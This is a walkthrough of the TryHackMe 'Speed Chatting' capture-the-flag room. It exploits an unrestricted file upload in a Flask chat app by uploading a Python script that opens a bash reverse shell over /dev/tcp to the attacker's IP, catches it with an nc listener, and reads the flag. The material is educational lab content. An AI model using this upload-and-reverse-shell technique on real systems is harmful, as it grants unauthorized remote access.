# Speed Chatting Walkthrough

## Intro
Welcome to the Speed Chatting challenge, here is the link to the [room](https://tryhackme.com/room/lafb2026e4) on TryHackMe.

### Scenario 
Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.

As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

You can find the web application here: `http://10.81.160.114:5000`

<br/>

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
We can get some more info with nmap:
```bash
 nmap -sV -sC -p 5000 10.81.160.114
```

It shows:
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.10.12)
|_http-title: LoveConnect - Speed Chatter
|_http-server-header: Werkzeug/3.1.5 Python/3.10.12
```

Let's open our browser and navigate to the web application URL we have found tin the scenario.

Looking at the page source code we can spot a JavaScript block, it handles both the upload functionality and the chat
```js
 // File upload
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name || 'No file selected';
            document.getElementById('fileName').textContent = fileName;
        });
        
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            const button = this.querySelector('button');
            button.textContent = 'Uploading...';
            button.disabled = true;
        });

        // Chat functionality
        const chatContainer = document.getElementById('chatContainer');
        const chatInput = document.getElementById('chatInput');
        const sendBtn = document.getElementById('sendBtn');

        function loadMessages() {
            fetch('/api/messages')
                .then(r => r.json())
                .then(messages => {
                    chatContainer.innerHTML = '';
                    messages.forEach(msg => {
                        const div = document.createElement('div');
                        div.className = 'message' + (msg.user === 'demo' ? ' demo' : '');
                        
                        // Create text nodes to prevent any HTML rendering
                        const userDiv = document.createElement('div');
                        userDiv.className = 'message-user';
                        userDiv.textContent = msg.user;
                        
                        const textDiv = document.createElement('div');
                        textDiv.className = 'message-text';
                        textDiv.textContent = msg.text;
                        
                        const timeDiv = document.createElement('div');
                        timeDiv.className = 'message-time';
                        timeDiv.textContent = msg.time;
                        
                        div.appendChild(userDiv);
                        div.appendChild(textDiv);
                        div.appendChild(timeDiv);
                        
                        chatContainer.appendChild(div);
                    });
                    chatContainer.scrollTop = chatContainer.scrollHeight;
                });
        }

        function sendMessage() {
            const text = chatInput.value.trim();
            if (!text) return;

            fetch('/api/send_message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({text: text})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    chatInput.value = '';
                    loadMessages();
                }
            });
        }

        sendBtn.addEventListener('click', sendMessage);
        chatInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });

        // Load messages on page load and refresh every 3 seconds
        loadMessages();
        setInterval(loadMessages, 3000);
```

Uploading a test image and checking the response we find out that it gets put:
```
http://10.81.160.114:5000/uploads/profile_7347353a-75d4-40e0-a1cc-0654282b80b2.png
```

```bash
curl -i -X POST http://10.82.140.206:5000/upload_profile_pic -F "profile_pic=@shell.py" | grep uploads
```

Since the back-end is running on Python we can test to upload a reverse shell in python:
```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.82.69.133/1234 0>&1'")
```

Save it as `shell.py` and upload it.
Now prepare a listener:
```bash
nc -lvnp 1234
```

Since everything is now ready we can refresh the web page and we get a shell in our terminal.

Finally we can get the flag:
```bash
ls
cat flag.txt
```
--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited the file upload vulnerability and managed to get access to the target via a reverse shell.

Happy Valentine!

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
